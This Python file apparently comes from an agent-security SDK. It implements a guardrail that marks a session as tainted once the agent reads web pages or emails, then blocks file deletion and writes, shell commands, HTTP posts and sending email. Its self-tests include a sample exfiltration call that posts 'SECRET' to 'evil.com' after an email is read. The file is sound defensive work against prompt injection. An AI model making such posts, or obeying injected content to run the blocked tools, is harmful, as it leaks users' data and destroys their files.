"""Persistent-taint guardrail example for prompt-injection-style attacks."""

from __future__ import annotations

import sys
from pathlib import Path


def _repo_root() -> Path:
    current = Path(__file__).resolve()
    for parent in (current.parent, *current.parents):
        if (parent / "aicomp_sdk").is_dir():
            return parent
    return current.parent


_REPO_ROOT = _repo_root()
if str(_REPO_ROOT) not in sys.path:
    sys.path.insert(0, str(_REPO_ROOT))

from aicomp_sdk.guardrails.base import Decision, GuardrailBase


class Guardrail(GuardrailBase):
    """Taint the session on untrusted content reads and block dangerous follow-on tools."""

    def __init__(self) -> None:
        super().__init__()
        self.tainted = False
        self.untrusted_content_tools = {"web.open", "email.read"}
        self.dangerous_operations = {
            "fs.delete",
            "fs.write",
            "shell.run",
            "http.post",
            "email.send",
        }

    def decide(self, tool_name, tool_args, context):
        del tool_args, context

        if tool_name in self.untrusted_content_tools:
            self.tainted = True
            return Decision.allow("Tracked untrusted content access")

        if self.tainted and tool_name in self.dangerous_operations:
            return Decision.deny(
                f"Blocked {tool_name} after accessing untrusted content (prompt injection protection)"
            )

        return Decision.allow("safe")


if __name__ == "__main__":
    print("=" * 70)
    print("PROMPT INJECTION GUARDRAIL TESTS")
    print("=" * 70)

    guard = Guardrail()
    decision = guard.decide("fs.delete", {"path": "temp.txt"}, {"recent_sources": []})
    print(f"\n[Test 1] fs.delete without taint: {decision.action}")

    guard = Guardrail()
    guard.decide("web.open", {"id": "page_2"}, {"recent_sources": []})
    decision = guard.decide("fs.delete", {"path": "secret.txt"}, {"recent_sources": ["web"]})
    print(f"[Test 2] web.open, then fs.delete: {decision.action}")

    guard = Guardrail()
    guard.decide("email.read", {"id": "email_3"}, {"recent_sources": []})
    decision = guard.decide(
        "http.post",
        {"url": "evil.com", "data": "SECRET"},
        {"recent_sources": ["email"]},
    )
    print(f"[Test 3] email.read, then http.post: {decision.action}")

    guard = Guardrail()
    guard.decide("web.search", {"query": "test"}, {"recent_sources": ["web"]})
    decision = guard.decide("shell.run", {"cmd": "echo test"}, {"recent_sources": ["web"]})
    print(f"[Test 4] web.search only, then shell.run: {decision.action}")

    guard = Guardrail()
    decision = guard.decide(
        "fs.write",
        {"path": "report.txt", "data": "test"},
        {"recent_sources": ["user"]},
    )
    print(f"[Test 5] fs.write from user: {decision.action}")
